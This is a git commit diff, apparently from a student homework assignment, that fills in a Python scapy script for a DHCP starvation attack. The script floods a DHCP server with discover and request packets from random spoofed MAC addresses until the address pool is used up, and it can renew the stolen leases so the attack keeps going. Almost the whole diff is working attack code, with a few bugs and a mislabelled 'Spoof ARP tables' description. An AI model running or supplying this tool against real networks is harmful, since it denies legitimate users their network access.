5a47a653da1f656ddc0a4c570bd18b0de42dcc34
arielbark9 <arielbark9@gmail.com>
2022-03-28 08:37:18 -0400

    hw2

--- DHCPstarvation/DHCPstarvation.py
+++ DHCPstarvation/DHCPstarvation.py
@@ -1,16 +1,14 @@
 # Ariel Bar Kalifa 214181604
 # Yedidya Marashe 213661499
 
-
 import argparse
+import time
 from itertools import count
-import random
-import re
-from urllib import response
-from scapy.all import *
-import progress
+from multiprocessing import Process
 
-IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"   
+from scapy.all import *
+
+IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
 count = 0
 
 
@@ -22,7 +20,8 @@ def validate_ip_address(address):
         return address
     raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')
 
-def ganerate_mac_address():
+
+def generate_mac_address():
     return ("%02x:%02x:%02x:%02x:%02x:%02x" % (
         random.randint(0, 255),
         random.randint(0, 255),
@@ -30,61 +29,89 @@ def ganerate_mac_address():
         random.randint(0, 255),
         random.randint(0, 255),
         random.randint(0, 255),
-        ))
+    ))
 
-def starv():
-    #TODO:
-    #make a while loop that will do a dhcp request with a random mac address
-    #the ip src in the dhcp request will be the 0.0.0.0 and the ip dst will be the target(or broadcast)
-    #will take all the available ip addresses
-    #if the -p check is true, will save clock for every ip address and will renew the
-    #dhcp request 5 seconds before the end of the clock
+
+def starve(args):
+    """
+    make a while loop that will do a dhcp request with a random mac address
+    the ip src in the dhcp request will be the 0.0.0.0 and the ip dst will be the target(or broadcast)
+    will take all the available ip addresses
+    if the -p check is true, will save clock for every ip address and will renew the
+    dhcp request 5 seconds before the end of the clock
+    """
+    while True:
+        mac = generate_mac_address()
+        ip, lease_time = get_ip_address(mac, args)
+        if ip:
+            print("IP: " + ip)
+        else:
+            print("No IP address")
+            break
+        if args.persist:
+            # save clock for every ip address and renew the dhcp request 5 seconds before the end of the clock
+            renewal_thread = Process(target=renew, args=(lease_time, ip, mac, args))
+            renewal_thread.start()
+            renewal_thread.join()
+        print(count)
+
+
+def get_ip_address(mac, args) -> (str, str):
+    """
+    send the dhcp discover packet to the target
+    """
     target = "255.255.255.255"
-    if(args.target):
+    if args.target:
         target = args.target
-    dhcp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst=target)/UDP(sport=68,dport=67)/BOOTP(op=1)/DHCP(options=[('message-type','discover'),('end')])
-    while True: #meybe do change the while loop till we get the dhcp server full 
-        #send to other function with other proceses
-        p = Process(target=sendPacket, args=(dhcp_request,))
-        p.start()
-        p.join()
+    # craft dhcp discover packet
+    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / IP(src="0.0.0.0", dst=target) / UDP(sport=68, dport=67) / BOOTP(
+        op=1, chaddr=mac) / DHCP(options=[("message-type", "discover"), ("end")])
 
-        print(count)        
-        
+    # send the dhcp discover packet
+    offer = srp1(dhcp_discover, iface=args.iface, timeout=0.5, verbose=0)
+    print(offer.show())
+    if offer:
+        # craft dhcp request packet
+        dhcp_request = Ether(dst=offer.src, src=mac) / IP(src="0.0.0.0", dst=args.target) / UDP(sport=68, dport=67) / BOOTP(
+            op=1, chaddr=mac) / DHCP(options=[("message-type", "request"), ("requested_addr", offer.getlayer(BOOTP).yiaddr),
+                                                         ("server_id", offer.getlayer(BOOTP).siaddr), ("end")])
 
-        
-        #need to send the dhcp request to the target
-    
-def sendPacket(dhcp_request):
-    mac = ganerate_mac_address()
-    dhcp_request.src = mac
-    response = sr1(dhcp_request, iface=args.iface)
-    if response:
-        dhcp_request.dst = response.src
-        #dhcp_request.options =[('message-type','request'),('requested_addr',response.getlayer(BOOTP).yiaddr),('server_id',response.getlayer(BOOTP).siaddr),('end')]
+        ack = srp1(dhcp_request, iface=args.iface, timeout=0.5, verbose=0)
+        if ack:
+            # return the ip address and the lease time
+            return offer.getlayer(BOOTP).yiaddr, offer.getlayer(BOOTP).options[-1][1]
+    return None, None
 
-        response = sr1(dhcp_request, iface=args.iface)
-        if response:
-            count += 1
-    #TODO:
-    #check how we get the clock for the dhcp request
-    #if the -p check is true, will save clock for every ip address and will renew the
-    
-    #if(args.persist):
-        #time.sleep(5)
-
+def renew(lease_time, ip, mac, args):
+    """
+    renew ip lease from dhcp server
+    :param ip:
+    :param mac:
+    :param args:
+    :return:
+    """
+    time.sleep(lease_time - 5)
+    target = "255.255.255.255"
+    if args.target:
+        target = args.target
+    # craft dhcp renewal packet with the ip address
+    dhcp_renew = Ether(dst=mac, src=mac) / IP(src=ip, dst=target) / UDP(sport=68, dport=67) / BOOTP(op=1, chaddr=mac) / DHCP(
+        options=[("message-type", "request"), ("requested_addr", ip), ("end")])
+    # send the dhcp renewal packet
+    ack = srp1(dhcp_renew, iface=args.iface, timeout=0.5, verbose=0)
+    if ack:
+        print("Renewed IP: " + ip)
 
 def main():
     # initialize argument parser for command line
     parser = argparse.ArgumentParser(description="Spoof ARP tables")
-    parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
-    parser.add_argument("-p","--persist", help="Renew the attack if about to end", choices=get_if_list())
-    parser.add_argument("-t","--target", help="IP of target", type=validate_ip_address, required=True)
-    
+    parser.add_argument("-i", "--iface", help="Interface you wish to use", choices=get_if_list())
+    parser.add_argument("-p", "--persist", help="Renew the attack if about to end")
+    parser.add_argument("-t", "--target", help="IP of target", type=validate_ip_address, required=True)
+
     args = parser.parse_args()
-    starv(vars(args))
+    starve(args)
 
 
 if __name__ == "__main__":
-    main()                                                                     
-        
+    main()
